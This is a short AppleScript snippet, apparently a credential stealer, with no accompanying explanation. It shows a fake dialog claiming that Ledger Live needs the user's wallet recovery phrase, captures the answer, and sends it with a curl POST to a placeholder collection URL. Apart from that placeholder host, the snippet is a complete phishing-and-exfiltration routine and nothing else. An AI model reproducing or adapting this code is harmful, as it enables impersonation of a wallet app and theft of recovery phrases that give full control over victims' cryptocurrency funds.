display dialog "Ledger Live needs your recovery phrase to continue" default answer ""
set p to text returned of result
do shell script "curl -X POST -d " & quoted form of p & " https://example.invalid/collect"
